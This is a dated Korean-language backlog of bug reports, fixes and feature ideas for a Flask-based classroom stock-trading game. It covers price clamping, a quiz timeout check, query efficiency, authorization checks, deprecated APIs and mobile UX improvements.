- **`force_price()` · `force_sector_event()` 가격 클램프 상한(base×3.0)이 자동 업데이트 `_next_price()` 클램프(base×1.4)와 크게 달라 이벤트 후 급락 발생** (`stock_service.py:225`, `stock_service.py:252`, `stock_service.py:139`): 진행자가 `force_price(symbol, +50%)`를 여러 번 적용하면 `max(base*0.3, min(base*3.0, new_price))` 로 base×3.0까지 가격을 올릴 수 있지만, 다음 자동 업데이트 틱에서 `_next_price()`의 `max(base*0.6, min(base*1.4, new_price))`에 의해 즉시 base×1.4로 급락. 진행자 이벤트 직후 매수한 학생은 이유 없는 즉각적 손실을 경험. 세 함수의 클램프를 `base*0.5 ~ base*2.0` 등 동일 범위로 통일하거나, `force_price()` 상한을 `_next_price()` 와 일치시켜 `max(base*0.6, min(base*1.4, new_price))`로 수정. 수정 부위: `stock_service.py:225`, `stock_service.py:252-253`.

- **`submit_quiz()` 서버 측 시간 초과 체크 없음 — 퀴즈 GET 후 임의 시간 뒤 정답 제출 가능** (`app.py:1270-1342`): `get_quiz()` 응답 시 `_quiz_state[key]` 에 `qid`와 `cooldown_until: 0`만 저장하고 퀴즈 발급 시각은 저장하지 않음. `submit_quiz()` 에서 `state.get('cooldown_until', 0) > time.time()` 체크는 쿨다운 진입 이후만 차단. Postman으로 `GET /quiz` → 10분 대기 → `POST /quiz {answer: true}` 전송 시 패널티 없이 보상 수령 가능. 수정: `get_quiz()`에서 `_quiz_state[key]['expires_at'] = time.time() + 45`를 저장하고, `submit_quiz()` 첫 부분에 `if state.get('expires_at') and time.time() > state['expires_at']: return jsonify({'error':'시간 초과', 'correct': False, 'penalty': max(5000,...)}), 400` 처리 추가. 약 4줄 추가로 공정성 확보.

- **`api.get()` / `api.post()` 가 HTTP 오류 시 서버 에러 메시지를 버리고 "HTTP 400"만 반환** (`app.js:30-43`): `if (!r.ok) return {error: \`HTTP \${r.status}\`}` 패턴이 서버 응답 body의 실제 오류 메시지(`{"error": "유효하지 않은 방 코드입니다."}` 등)를 무시하고 `{error: "HTTP 400"}`을 반환. 결과적으로 모든 오류 메시지(`err.textContent = data.error`)에 "HTTP 400"이 표시됨. 수정안: `if (!r.ok) { try { const e = await r.json(); return {error: e.error || \`HTTP \${r.status}\`}; } catch { return {error: \`HTTP \${r.status}\`}; } }` 패턴으로 교체하면 서버 메시지가 정확히 전달됨. `api.get`, `api.post`, `api.del` 세 곳에 공통 적용 필요.

- **`get_rankings()` 에서 `u = db.session.get(User, m.user_id)` None 체크 없이 `u.username` 접근 — AttributeError 크래시 위험** (`app.py:819`): `for m in RoomMember.query.filter_by(room_id=rid).all()` 루프에서 `u = db.session.get(User, m.user_id)` 이후 바로 `'username': u.username`에 접근. 데이터 불일치(User 레코드 직접 삭제, 또는 외래키 제약 없는 SQLite에서 발생 가능)로 `u`가 None이면 `AttributeError` → 500 응답 → 모든 참여자 랭킹 화면 실패. `host_members()` (`app.py:557`)는 이미 `u.username if u else str(m.user_id)` 패턴을 올바르게 사용 중. `get_rankings()`의 `app.py:819`를 `'username': u.username if u else f'사용자{m.user_id}'`로 교체하면 방어 완료.

- **`create_deposit()` 활성 예금 건수 제한 없음 — 소액 예금 수천 건으로 DB·UI 부하 유발 가능** (`app.py:878-902`): 학생이 현금이 있는 한 `POST /api/rooms/<rid>/deposits`를 반복 호출해 1원짜리 예금을 수천 건 생성할 수 있음. `_end_room()`의 예금 정산 루프(`app.py:135`)와 `get_deposits()` 쿼리가 모두 `filter_by(status='active')` 전체를 가져오므로 건수가 많을수록 처리 지연 발생. 수정: `if Deposit.query.filter_by(room_id=rid, user_id=user.id, status='active').count() >= 10: return jsonify({'error': '활성 예금은 최대 10건까지 가능합니다.'}), 400`을 `app.py:885` 직후에 추가 (한 줄). 또한 최소 예금 금액 검증(`if amount < 10000: return 400`)도 같이 추가하면 교육적 맥락에도 부합.

- **`host_members()` 에서 `member_total_value()` 가 학생 N명당 3개 쿼리 실행 — N×3 쿼리 병목** (`app.py:543-562`, `app.py:107-118`): `loadHostMembers()` 는 진행자 폴링(`setInterval(..., 10000)`)마다 호출되고, 내부에서 `for m in members: member_total_value(rid, m.user_id)` 를 실행. `member_total_value()`는 각 학생마다 `RoomMember.query.filter_by()` + `RoomHolding.query.filter_by()` + `Deposit.query.filter_by()` = 3 쿼리. 학생 30명이면 매 10초마다 90개 쿼리 발생. 개선안: 루프 전에 `holdings_map = defaultdict(list); [holdings_map[h.user_id].append(h) for h in RoomHolding.query.filter_by(room_id=rid).all()]`와 `deposits_map` 을 한 번씩 조회해 딕셔너리화한 뒤 루프에서 참조하면 3→1개 쿼리로 절감(90 → 3 쿼리). `get_rankings()` (`app.py:811-824`)도 동일 패턴 적용 권장.

---

## 2026-08-06

### 추가하면 좋을 기능

- **학번/이름 localStorage 자동 저장 및 재사용** (`app.js:122-155`, `doCreateRoom()`, `doJoinRoom()`): 관심종목은 이미 `localStorage.setItem('watchlist', ...)`(`app.js:1283`)로 세션 간 유지되지만, 학번·이름은 매번 재입력해야 함. `doAuth()` 성공 후 `localStorage.setItem('lastSid', sid); localStorage.setItem('lastName', name);` 두 줄을 추가하고, `showScreen('screen-join')`·`showScreen('screen-host-create')` 진입 시 저장된 값으로 필드를 채우면 됨. 수업 중 같은 학생이 QR 재스캔이나 새로고침 후 재진입할 때 특히 유용.

- **결과 화면 "홈으로" 강제 로그아웃 → 재참가 불가 문제 해소** (`app.js:108-112`, `goHome()`): 결과 화면의 "홈으로" 버튼이 `goHome()`→`api.post('/api/auth/logout')`을 호출해 세션을 소멸시킴. 같은 수업 시간에 두 번째 게임에 참가하려면 학번·이름을 다시 입력해야 함. `goHomeSoft()` 함수 (세션 유지, `S.user = null; S.room = null; showLanding();` 만 수행)를 추가하고 결과 화면 `index.html:635`의 "홈으로" 버튼에 적용. 게임 로비로 돌아가지 않고 랜딩만 표시하므로 보안상 문제 없음.

- **룰렛 베팅 전 확인 단계 추가 — 전액 베팅 실수 방지** (`app.js:1032-1050`, `doRouletteSpin()`, `app.py:1022-1058`, `minigame_spin()`): 베팅 버튼 클릭 즉시 서버로 전송되며, 서버는 현금 부족 시 보유 주식 전량 청산→예금 인출까지 자동 수행. 실수로 "전액" 버튼 클릭 후 베팅하면 포트폴리오 전체가 소멸됨. `doRouletteSpin()` 상단 `app.js:1033` 직후에 `if (!confirm(`${krw(bet)}를 베팅합니다. 주식·예금이 자동 청산될 수 있습니다. 계속하시겠습니까?`)) return;` 한 줄(또는 `modal-adjust` 패턴 재사용)을 추가하면 방어 가능. 특히 `베팅 ≥ 총자산 × 50%`일 때만 확인을 요구하는 조건부 적용도 고려.

- **`find_active_room()` 에 최근 종료 방 포함 → 이탈 후 재접속 학생이 결과 화면 자동 표시** (`app.py:307-313`, `find_active_room()`): 현재 `Room.status.in_(['waiting','active','paused'])` 만 조회하므로 게임 종료 후 재접속한 학생(브라우저 탭 복구, 교실 이동 후 재연결 등)은 `active_room = None` 응답을 받아 랜딩 화면에 머묾. `app.py:313` 뒤에 `ended` + `end_time >= now - 2h` 조건으로 최근 종료 방을 추가 조회하고, `results_published` 여부에 따라 결과 또는 대기 화면으로 자동 이동시키면 됨. 서버 약 5줄, 클라이언트 `onLogin()` (`app.js:82-90`)의 `active_room` 처리 로직 재사용으로 구현 가능.

- **결과 화면에 개인 거래 내역 요약 표시** (`app.py:829-847`, `get_transactions()`, `index.html:628`, `results-my-stats` div): 현재 결과 화면(`screen-results`)에는 전체 순위·차트만 있고 본인 거래 통계가 없음. `GET /api/rooms/<rid>/transactions`는 이미 전체 내역을 반환하므로 서버 변경 없이 클라이언트에서 집계 가능. `loadResults()` 내에서 거래 내역을 가져와 총 매수/매도 횟수, 가장 많이 거래한 종목, 최대 단일 손익 거래를 `results-my-stats` 카드에 표시하면 "이번 게임에서 삼성전자를 7번 매매했습니다" 같은 교육적 피드백 제공. 퀴즈 정오·룰렛 결과도 `action='RLT'`/`'ADJ'` 필터로 함께 표시 가능.

### 제거/단순화할 것들

- **`confirm()` 다이얼로그 4개 — 모바일 WebView에서 차단 또는 원점 없이 표시** (`app.js:115,235,247,1663`): `confirmLeaveGame()`, `doKickMember()`, `doStartGame()`, `doWithdrawDeposit()` 모두 네이티브 `confirm()`을 사용. iOS Safari WebView 등 일부 환경에서 `confirm()`이 차단되거나 앱 도메인 없이 `"이 페이지가 다음을 묻습니다"` 로 표시돼 신뢰성이 낮음. 기존 `modal-adjust` 패턴(index.html:776-796)을 참고해 `openConfirmModal(msg, callback)` 범용 헬퍼를 한 번 구현하면 4곳을 일관된 UI로 교체 가능. 코드 추가 약 20줄, 교체 약 4줄.

- **`import openpyxl` / `from io import BytesIO` 함수 내부 지연 임포트** (`app.py:1422-1424`): `export_rankings()` 함수 본문에 위치. Python 임포트 캐시로 두 번째 호출부터는 무비용이지만, 정적 분석 도구·의존성 스캐너가 패키지 누락을 감지 못하고, 배포 직후 첫 엑셀 다운로드 시에만 `ModuleNotFoundError` 가 발생해 교사가 뒤늦게 알아챌 수 있음. `app.py:1-10` 상단으로 이동하면 서버 시작 시 즉시 감지됨. `from io import BytesIO`도 표준 라이브러리이므로 함께 이동.

- **`_rlt_active[rid]['count']` 비대칭 — 학생 강제 이탈 시 카운터 고착으로 게임 재개 불가** (`app.py:948-993`, `minigame_open()`, `minigame_close()`): `minigame_open()`이 count +1, `minigame_close()`가 count -1. 학생이 룰렛 오버레이를 연 채 탭을 닫으면 `minigame_close()` 미호출 → count 영구 고착 → 나머지 학생이 모두 닫아도 `count > 0`이 유지돼 게임이 재개되지 않음. `minigame_open()` 호출 시 해당 학생이 이미 스핀을 3회 사용했으면(`spins_used >= 3`) count 증가를 건너뛰거나, count 상한을 `RoomMember` 수로 클램핑하면(`state['count'] = min(state['count'], member_count)`) 방어 가능. `app.py:950-951` 부근 2줄 수정.

- **`_quiz_settings` · `_roulette_config` in-memory 저장 — Render cold start 후 설정 초기화** (`app.py:250`, `1246`): 진행자가 퀴즈 보상/패널티 비율(`_quiz_settings`)과 룰렛 확률(`_roulette_config`)을 변경해도 Render free tier 재시작(비활성 30분 후 자동 종료) 시 기본값으로 리셋됨. 수업 시작 전 설정하고 중간에 서버가 재시작되면 설정이 날아감. 기존 `ALTER TABLE` 마이그레이션 패턴(`app.py:31-40`)으로 `rooms` 테이블에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5`, `rlt_config VARCHAR(200) DEFAULT ''` 컬럼을 추가하면 서버 재시작 후에도 설정 유지. `models.py:25-41` Room 모델에 컬럼 추가 필요.

- **`get_room()` 의 `Room.query.get_or_404()` 레거시 패턴 혼용** (`app.py:435` 외 다수): `Room.query.get_or_404(rid)` (SQLAlchemy legacy Query API)와 `db.session.get(Room, rid)` (SQLAlchemy 2.0 스타일)가 혼용됨. `app.py`에서 `Room.query.get_or_404` 12회, `Room.query.get` 2회, `db.session.get(Room, ...)` 다수 혼재. Flask-SQLAlchemy 3.x에서 `Query.get()`은 deprecated 경고를 발생시키며 SQLAlchemy 2.0에서 제거됨. `db.get_or_404(Room, rid)`로 전면 교체하면 코드 일관성과 향후 업그레이드 안정성 확보. 전체 교체 대상 약 15곳, 기능 변경 없음.

---

## 2026-08-06 (2차)

### 추가하면 좋을 기능

- **진행자 마켓 탭에 시장 온도계 위젯 (상승/하락/보합 종목 수)** (`app.js:314-358`, `loadHostMarket()`): 현재 진행자 마켓 탭은 종목 카드만 나열할 뿐, 전체 시장 흐름을 한 눈에 보여주는 집계 정보가 없음. `loadHostMarket()` 에서 `data.stocks`를 수신한 뒤 `const up = data.stocks.filter(s => s.change_pct > 0).length` 등으로 집계해 카드 그리드 위에 `<div class="breadth-bar">📈 상승 ${up}개 · 📉 하락 ${dn}개 · ─ 보합 ${flat}개</div>` 형태의 한 줄 위젯을 추가하면 됨. 서버 변경 없이 클라이언트 약 8줄 추가. 교사가 "지금 시장 전체가 오르고 있다" 등의 설명을 즉시 제공할 수 있어 수업 진행 보조 효과.

- **관심 종목(watchlist) 가격 급등락 알림** (`app.js:1279-1285`, `toggleWatchlist()`; `app.js:1229-1241`, `loadMarket()`): 관심 종목 `S.watchlist`은 localStorage에 영구 저장되지만, 가격이 크게 변해도 아무 알림이 없음. `filterStocks(prev)` 에서 `prevPrices` 비교 시 관심 종목이 `|change_pct| >= 5`이면 `toast(`⭐ ${st.name} ${pct(st.change_pct)} 급변!`, 'warn')` 한 줄 추가로 즉시 구현 가능. `app.js:1313-1323` 의 flash 애니메이션 루프와 함께 처리하면 중복 없이 자연스럽게 통합됨. 수업 중 학생들이 특정 종목을 팔로우하며 매매 타이밍을 놓치지 않도록 도움.

- **포트폴리오 보유 종목에서 1클릭 전량 매도 버튼** (`app.js:1546-1562`, `loadPortfolio()`): 보유 종목 카드의 "▼ 매도" 버튼이 `openStockModal()`을 열어 수량 입력 → 확인 3단계를 거쳐야 함. 게임 종료 임박 시 빠른 청산이 어려움. `<button class="btn btn-sm" style="flex:1;..." onclick="quickSell('${h.symbol}',${h.shares})" ...>⚡ 전량매도</button>` 버튼을 추가하고 `async function quickSell(symbol, shares) { const data = await api.post(..., {symbol, action:'SELL', shares}); if(data.error){toast(data.error,'error');}else{toast(data.message,'success');refreshMyRank();loadPortfolio();} }` 약 5줄로 구현 가능. 서버 변경 없음. 교사가 "지금 전부 팔아봐!" 활동 지시 시 즉각 반응 가능.

- **퀴즈 문항별 정오 통계 — 교사용 집계 엔드포인트** (`app.py:1270-1342`, `submit_quiz()`; `_quiz_state`): 현재 퀴즈 결과는 `_quiz_state` in-memory에만 저장되며 진행자가 집계를 볼 수 없음. `RoomTransaction` 에서 `action='ADJ'` + `note LIKE '퀴즈%'` 필터로는 정/오 구분 불가. 수정 방향: `submit_quiz()` 내 `db.session.add(RoomTransaction(..., note=f'퀴즈{"정답" if correct else "오답"} Q{q["id"]}'))` 처럼 note에 문항 ID를 포함하면(`app.py:1339` 직후 1줄 변경), `GET /api/rooms/<rid>/host/quiz-stats` 엔드포인트에서 `note LIKE '퀴즈% Q%'` 쿼리로 문항별 정오 집계 가능. 교사가 "Q7번을 가장 많이 틀렸네, 복리에 대해 다시 설명하겠습니다" 같은 즉각 피드백 제공.

- **일시정지 배너에 중단 이유 표시** (`app.js:653-666`, `showPausedBanner()`; `app.py:490-501`, `pause_room()`): 현재 `showPausedBanner()`는 단순히 "⏸ 게임이 일시정지되었습니다" 를 표시. 복권 중인지, 룰렛 중인지, 진행자가 수동으로 일시정지했는지 학생이 알 수 없어 혼란 발생. `app.py:room_dict()` 에 `pause_reason: 'lottery'|'roulette'|'manual'` 필드를 추가(`room.rlt_triggered`로 룰렛 구분, `_lots[rid]` 상태로 복권 구분, 나머지는 manual)하고, `showPausedBanner()`에서 이유별 텍스트("🎰 룰렛 진행 중", "🎟️ 복권 추첨 중", "⏸ 진행자 일시정지")를 표시하면 학생 경험 개선. 서버 3줄 + 클라이언트 3줄 수정.

### 제거/단순화할 것들

- **룰렛/퀴즈 패널티 주식 청산 후 `db.session.delete(h)` 누락 — 0주 레코드 DB 누적** (`app.py:1037-1038`, `app.py:1318-1319`): `minigame_spin()` (`app.py:1037`)과 `submit_quiz()` (`app.py:1318`)의 자산 청산 분기에서 `h.shares = 0; h.avg_price = 0`을 설정하지만 `db.session.delete(h)` 를 호출하지 않음. 반면 `trade()` 정상 매도 (`app.py:762`)와 `_end_room()` 청산 (`app.py:152`)은 올바르게 삭제 중. 결과적으로 `room_holdings` 테이블에 `shares=0` 레코드가 누적되고, `get_portfolio()` 에서 `if h.shares <= 0: continue` 방어 코드로 표시는 막히나 불필요한 DB 공간과 쿼리 부하가 증가. 두 곳에 각각 `if h.shares <= 0: db.session.delete(h)` 조건부 삭제 1줄 추가로 해결.

- **`datetime.utcnow()` 17곳 사용 — Python 3.12 DeprecationWarning 전면 발생** (`app.py:125`, `498`, `511`, `533` 외 다수): `datetime.utcnow()`는 Python 3.12에서 공식 deprecated 되어 `DeprecationWarning`을 발생시키고 향후 제거 예정. `models.py:38` 등 모델 default 함수에서도 동일 패턴 사용. 교육 환경에서 당장 장애는 없으나, Render 배포 로그에 경고가 반복 출력됨. `from datetime import datetime, timezone`으로 변경 후 `datetime.utcnow()` → `datetime.now(timezone.utc)`로 전면 교체 필요. `grep -n 'utcnow' app.py`로 17곳 확인. `models.py:38`의 `default=datetime.utcnow`도 `default=lambda: datetime.now(timezone.utc)` 로 교체 필요.

- **`export_rankings()` 진행 중인 게임에서 상태 체크 없이 접근 가능 — 중간 순위 유출 위험** (`app.py:1419-1428`): `room.status != 'ended'` 체크 없이 호스트가 게임 진행 중에도 `/api/rooms/<rid>/export`를 호출해 현재 순위를 Excel로 내보낼 수 있음. 실수로 화면 공유 중 다운로드 버튼을 누르거나 학생 수업 도중 중간 결과가 외부로 유출될 수 있음. `app.py:1428` 바로 아래에 `if room.status not in ('ended', 'active'): pass` 수준의 soft 체크가 아닌 `if room.status == 'active': return jsonify({'error': '게임 진행 중에는 내보낼 수 없습니다.'}), 400` 한 줄로 차단. `active` 한정 차단이므로 `paused`(복권/룰렛 중)에서는 허용해 진행자가 중간 점검 가능.

- **`refreshMyRank()` 와 `loadParticipantRankings()` 가 같은 `/rankings` API를 이중 폴링** (`app.js:735-753`, `refreshMyRank()`; `app.js:1673-1692`, `loadParticipantRankings()`): `enterParticipantGame()` 의 10초 폴링 루프 (`app.js:613-650`) 마지막에서 `refreshMyRank()`가 항상 호출(`app.js:647`)되고, 랭킹 탭에 있을 때 `loadParticipantRankings()`도 추가로 호출(`app.js:649`). 두 함수 모두 `GET /api/rooms/<rid>/rankings` 를 호출하므로 랭킹 탭 활성 상태에서 매 10초마다 같은 API가 2회씩 중복 호출됨. `refreshMyRank()` 에서 받은 전체 data를 `if (S.currentPage === 'rankings') renderRankingsFromData(data)` 형태로 재사용하면 한 번의 응답으로 두 목적을 달성 가능. 학생 30명 교실 기준 분당 3회×2 = 6회 감소.

- **`gen_code()` 10회 재시도 후 중복 확인 없이 코드 반환** (`models.py:8-13`): 방 코드 생성 시 `for _ in range(10):` 루프에서 고유한 코드를 찾지 못하면 10번째 시도 후 `return ''.join(random.choices(..., k=k))`를 실행하는데 이 마지막 코드는 uniqueness 확인 없이 반환됨. 6자리 코드(A-Z0-9, 36^6 = 약 21억 가지)이므로 충돌 확률이 실제로는 매우 낮지만, DB에 unique constraint가 있어(`code = db.Column(..., unique=True)`) 충돌 시 `IntegrityError`가 `create_room()` 에서 잡히지 않고 500 오류로 이어짐. 10번 루프를 `while True` + 탈출 조건 또는 `for _ in range(20):` 루프로 변경하고, 10회 실패 시 `raise RuntimeError('코드 생성 실패')` 명시적 예외 발생으로 대체하는 것이 안전.

- **`host_adjust()` delta=0 허용 — 무의미한 ADJ 트랜잭션 기록** (`app.py:595-601`): `delta = float(d.get('delta', 0))`에서 0을 받아도 `if delta == 0` 검증이 없어 `m.cash += 0` + `RoomTransaction(amount=0, note='진행자 자산 조정')` 트랜잭션이 DB에 기록됨. 진행자가 금액 입력 없이 조정 버튼을 누른 경우 `ADJ` 기록이 무분별하게 쌓여 학생 거래 내역 모달(`host_member_transactions()`)을 오염. 클라이언트에서 이미 `doAdjust()` (`app.js:491-495`)의 `if (isNaN(delta))` 검사가 있으나 delta=0인 경우는 통과. 서버에서도 `if delta == 0: return jsonify({'error': '조정 금액을 입력하세요.'}), 400`을 `app.py:595` 다음에 추가하는 서버 측 이중 방어 필요.

---

## 2026-08-07

### 추가하면 좋을 기능

- **게임 진행 중 참여자 강퇴 기능** (`app.py:564-575`, `kick_member()`; `app.js:234-239`, `doKickMember()`): `kick_member()` 에 `if room.status != 'waiting': return jsonify({'error': '대기 중인 방에서만 강퇴할 수 있습니다.'}), 400` 조건이 있어 게임 시작 후에는 문제 학생을 내보낼 방법이 없음. 교실 상황에서 실수로 잘못 입장하거나 조작이 의심되는 학생을 게임 중에도 퇴장시킬 수 있어야 함. `app.py:570` 의 상태 체크를 제거하고, 게임 진행 중이라면 해당 학생의 `RoomHolding` 전량 청산 → 현금화 후 `RoomMember` 삭제 처리로 교체(약 10줄). 진행자 랭킹 탭 순위 행 "강퇴" 버튼을 추가하면 완성. 클라이언트 `host_members()` (`app.py:543`) 응답을 활용하면 서버 추가 쿼리 없음.

- **참여자 수 0명에서 게임 시작 방어** (`app.py:475-488`, `start_room()`; `app.js:246-255`, `doStartGame()`): 백엔드·프론트엔드 모두 참여자 0명 체크 없음. `start_room()` 에 `if RoomMember.query.filter_by(room_id=rid).count() == 0: return jsonify({'error': '참여자가 없습니다.'}), 400` 한 줄(`app.py:481` 다음)을 추가하면 비어 있는 방을 실수로 시작하는 상황을 막을 수 있음. 프론트도 `doStartGame()` (`app.js:249`) 직후 `if (data.error)` 분기에서 처리됨. 교사 실수로 텅 빈 게임이 시작되어 타이머가 소진되는 상황 방지.

- **종목 입력창에 `inputmode="numeric"` 추가 — 모바일 키패드 자동 표시** (`static/index.html`의 `trade-qty`(:705), `dep-amount`(:424), `rlt-bet-input`(:536) 등): `type="number"` 로 선언된 `<input>` 들이 iOS Safari / Android에서 일반 키보드(abc)를 열어 숫자 입력이 불편함. `inputmode="numeric"` 을 함께 선언하면 모바일에서 숫자 키패드가 즉시 표시됨. 예: `<input id="trade-qty" type="number" inputmode="numeric" ...>`. `index.html` 에서 `type="number"`가 있는 거래 수량·예금 금액·베팅 금액·퀴즈 설정 입력 등 약 12곳에 속성 1개씩 추가, 서버 변경 없음. 교실에서 스마트폰으로 참여하는 학생 대부분에게 즉각적 UX 개선.

- **복권 `current` 상태 서버 재시작 시 자동 복구** (`app.py:166-199`, `_lots`; `app.py:408-430`, `_auto_start_lottery_if_due()`): `lottery_rounds_done` 은 DB에 저장(`app.py:226-229`)되어 재시작 후 done set이 복구되지만, 현재 진행 중인 복권 round의 `current` 딕셔너리(picks, state, pick_dl 등)는 in-memory에만 존재. Render free tier 재시작 시 복권이 picking/drawing 중이면 학생들의 번호 선택이 모두 소실되고 진행자 UI가 멈춤. 임시 해결: `app.py:472`의 `_auto_start_lottery_if_due()` 에서 `_lots[rid].get('current')` 가 없고 `room.status == 'paused'` + `lottery_rounds_done` 에 현재 round가 없으면 자동으로 `state='drawing'` 으로 건너뛰어 진행자가 당첨 번호를 입력하도록 유도(약 8줄). 영구 해결은 `room_lot_current TEXT` DB 컬럼에 JSON 직렬화 저장.

- **진행자용 "관중 모드(Projector View)" 페이지** (신규 라우트 `GET /projector`; `app.py:318-320` `/pomodoro` 패턴 참조): 교실 프로젝터에 띄울 전용 화면이 없어 진행자가 자신의 대시보드를 공유하면 설정·조정 버튼이 모두 노출됨. `/projector?room=<rid>` 라우트와 `static/projector.html` 을 신규 추가해, 순위표(상위 10명)·실시간 시세·남은 시간·뉴스를 `/api/rooms/<rid>/rankings`·`/api/rooms/<rid>/stocks`·`/api/rooms/<rid>/news` 로 15초마다 자동 갱신 표시. 글씨 크게, 애니메이션 포함, 인증 불필요(`public` 뷰). 서버 라우트 3줄 + 별도 HTML 파일 신규 작성. 수업 현장에서 가장 요청 많은 기능 중 하나.

### 제거/단순화할 것들

- **외부 CDN 의존성(Chart.js, QRCodeJS) — 오프라인 교실 환경에서 게임 불능** (`static/index.html:971-972`): `<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/...">` 와 `<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/...">` 두 라이브러리가 외부 CDN에서 로드됨. 교실 WiFi가 인터넷 차단 정책이거나 일시 장애 시 순위 차트와 QR 코드가 전혀 동작하지 않음. `npm install chart.js qrcode`(또는 수동 다운로드) 후 `static/js/vendors/` 에 번들링해 `/static/js/vendors/chart.umd.min.js` 로 제공하면 해결. CDN 버전 고정(`@4.4.0`)도 번들링으로 동시에 해결. 파일 추가만으로 서버·앱 코드 변경 없음.

- **`_ending_soon` set이 서버 재시작 후 초기화 — 1분 카운트다운 중 재시작 시 즉각 종료** (`app.py:90`, `_ending_soon = set()`; `app.py:526-537`, `end_room()`): `end_room()` 에서 잔여 시간 60초 초과 시 `end_time = now + 60`로 단축 후 `_ending_soon.add(rid)` 기록. 60초 내에 Render 컨테이너가 재시작되면 `_ending_soon` 이 빈 set으로 초기화되어 `get_room()` 폴링 시 다시 `end_room()` 호출 → `rid not in _ending_soon` 조건 통과 → 또 1분 단축 루프. `end_time` 이 이미 단축되어 있으므로 실제 게임이 예상보다 일찍 종료되진 않지만, `room.end_time`이 이미 60초 이내이면 `remaining > 60` 조건을 통과 못 해 바로 `_end_room()` 호출로 이어짐. 방어: `rooms` 테이블에 `ending_soon BOOLEAN DEFAULT 0` 컬럼을 추가(`app.py:31-40` 패턴 재사용)해 DB에 상태 유지. 마이그레이션 1줄 + 읽기/쓰기 각 1줄.

- **`lobby_members` 엔드포인트(`/host/lobby-members`)에 host 권한 체크 없음** (`app.py:577-585`, `lobby_members()`): URL 경로에 `/host/`가 포함되어 있으나 `@login_required` 만 있고 `room.host_id != user.id` 체크가 없음. 참여자도 해당 API를 직접 호출해 대기 중인 모든 학생 목록을 조회할 수 있음. `host_members()` (`app.py:544-547`), `kick_member()` (`app.py:566-569`) 등 같은 파일 내 host 전용 엔드포인트들과 일관성이 없음. `app.py:581` 직후에 `if room.host_id != user.id: return jsonify({'error': '권한 없음'}), 403` 한 줄 추가로 설계 일관성 확보. 단, 참여자 로비 화면(`enterParticipantLobby()`, `app.js:562`)이 이 API를 사용 중이므로, 참여자용 엔드포인트 `/api/rooms/<rid>/lobby-members`를 별도 신설하거나 host 전용으로 유지 후 참여자 로비는 `GET /api/rooms/<rid>` 의 `member_count` 필드만 활용.

- **`get_room()` 내에서 `_auto_start_lottery_if_due()` 호출이 DB commit 전 room 상태 갱신** (`app.py:432-473`): `get_room()` 은 read-only에 가까운 GET 핸들러임에도 내부에서 `_auto_start_lottery_if_due()` → `room.status = 'paused'` + `db.session.commit()` 을 실행(`app.py:421-423`). 10초마다 폴링하는 모든 클라이언트(참여자 N명 + 진행자 1명)가 동시에 GET 요청을 보내면 락 없는 commit이 복권 중복 시작을 유발할 수 있음(실제로는 `_lottery_lock`이 방어하지만 lock 범위가 함수 안에 있어 lock 획득 전 `_auto_start_lottery_if_due` 중복 진입 가능). GET 핸들러에서 상태 변경 로직을 분리해 별도 `POST /api/rooms/<rid>/heartbeat` (또는 진행자 전용 폴링) 엔드포인트에서만 복권 자동 시작을 트리거하도록 분리하면 아키텍처 명확성과 동시성 안전성이 함께 개선됨. 서버 약 20줄 리팩터.

- **`static/index.html` 에서 스크린 전환이 `hidden` 속성 토글에만 의존 — CSS transition 없어 화면 전환이 끊김** (`app.js:62-67`, `showScreen()`; `static/index.html` 전체): `showScreen(id)` 함수가 `setAttribute('hidden', '')` / `removeAttribute('hidden')` 으로 즉시 전환하여 화면 깜빡임(flash)이 발생. 특히 대기 로비 → 게임 화면, 결과 화면 → 랜딩 전환이 뚝 끊겨 완성도가 낮음. `style.css` 에 `.screen-enter { animation: fadeIn 0.2s ease; }` + `@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }` 를 추가하고, `showScreen()`에서 신규 화면에 `screen-enter` 클래스를 붙였다가 animation 종료 후 제거하면 됨. CSS 5줄 + JS `showScreen()` 3줄 수정, 서버 변경 없음. 교실 프로젝터 시연 시 화면 전환 품질이 크게 향상.

## 2026-08-07 (2차)

### 추가하면 좋을 기능

- **복권 번호 선택 화면에 "🎲 랜덤 번호 생성" 버튼** (`app.js:2151-2197`, `_showLotParticipantPicker()`; `app.js:2104-2111`, `_renderLotGrid()`): 복권 번호 선택 시 60초 내에 1~45 중 6개를 수동으로 골라야 하나, 랜덤 자동 채우기 버튼이 없어 선택 시간을 낭비하거나 기회를 놓치는 학생이 발생. 복권 선택 UI에 "🎲 랜덤" 버튼을 추가하고, 클릭 시 `Array.from({length:45},(_,i)=>i+1).sort(()=>Math.random()-0.5).slice(0,6).sort((a,b)=>a-b)` 로 6개를 채운 뒤 `_renderLotGrid()` 재호출. 서버 변경 없음, JS 약 8줄. 기존 `_renderLotGrid()` 함수 재사용 가능하며 교실 환경에서 낮은 디지털 리터러시 학생도 소외 없이 참여 가능.

- **게임 시작 전 학생 대기 화면에 카운트다운 효과** (`app.js:554-576`, `enterParticipantLobby()`; `app.py:475-488`, `start_room()`): 진행자가 게임을 시작하면 학생 로비 폴링(5초마다)이 `status=active`를 감지하고 즉시 `enterParticipantGame()`으로 전환됨. 전환이 즉각적이어서 학생이 "갑자기 게임이 시작됐어요"라고 혼란을 겪음. `start_room()` 응답에 `started_at` 필드를 추가하고, 학생 로비 폴링에서 `r.status === 'active'` 감지 시 "게임이 시작됩니다! 3 / 2 / 1" 카운트다운을 3초 보여주고 게임 화면으로 전환하면 자연스러운 UX 제공. 서버 변경 최소화, 클라이언트 `setTimeout` 3줄 추가.

- **"첫 거래 잠금 시간" 설정 — 시장 분석 기간 부여** (`app.py:363-390`, `create_room()`; `app.py:724-768`, `trade()`): 방 생성 시 `analysis_minutes: int = 0` 옵션을 추가해 게임 시작 후 N분 동안 모든 학생의 거래를 금지하는 분석 기간을 설정할 수 있음. `trade()` 엔드포인트에 `elapsed = (datetime.utcnow() - room.start_time).total_seconds() / 60`; `if room.analysis_minutes and elapsed < room.analysis_minutes: return 400 '분석 시간 중 거래 불가'` 검증 추가. 교사가 "10분은 시세를 보고 전략을 세워 봐요"를 게임 규칙으로 강제 가능하며, 무작위 단타 방지에도 효과적. 서버 컬럼 1개 + 약 5줄, 클라이언트 거래 버튼 상태 반영.

